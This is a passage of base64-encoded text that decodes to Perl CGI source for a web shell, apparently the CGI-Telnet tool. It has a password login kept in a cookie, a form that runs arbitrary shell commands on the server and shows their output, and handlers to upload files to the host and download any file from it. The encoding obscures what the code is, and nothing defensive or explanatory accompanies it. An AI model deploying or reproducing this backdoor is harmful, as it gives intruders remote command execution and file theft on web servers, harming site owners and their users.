S0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2luIGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUNCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBhZ2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQgZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBhc3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJJlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3JpcHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBpcw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCglpZighJFdpbk5UKQ0KCXsNCgkJYWxhcm0oMCk7DQoJCXByaW50IDw8RU5EOw0KPC94bXA+DQoNCjxjb2RlPg0KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLg0KPGJyPktpbGxlZCBpdCENCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFuZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRoZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJDQoJCSRPbGREaXIgPSAkQ3VycmVudERpcjsNCgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZCI7DQoJfQ0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCgkJcHJpbnQgIiRQcm9tcHQgJFJ1bkNvbW1hbmQ8eG1wPiI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCgkJaWYoISRXaW5OVCkNCgkJew0KCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsNCgkJfQ0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJCXsNCgkJCSR8PTE7DQoJCQkkQ29tbWFuZCAuPSAiIHwiOw0KCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQoJCQl7DQoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkJcHJpbnQgIiRfXG4iOw0KCQkJfQ0KCQkJJHw9MDsNCgkJfQ0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCgkJew0KCQkJcHJpbnQgYCRDb21tYW5kYDsNCgkJfQ0KCQlpZighJFdpbk5UKQ0KCQl7DQoJCQlhbGFybSgwKTsNCgkJfQ0KCQlwcmludCAiPC94bXA+IjsNCgl9DQoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMNCgl7DQoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8gdGhlIGJyb3dzZXINCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7DQoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlWPVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KRU5EDQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNURE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShTRU5ERklMRSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQ0KIyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsDQojIHRoZSBmaWxlIGlzIHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50RmlsZVVwbG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCglwcmludCAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQlwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsNCgkJCXByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlwcmludCAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCXByaW50ICIiOw0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KDQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rDQojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIERvd25sb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJcmV0dXJuOw0KCX0NCgkNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFR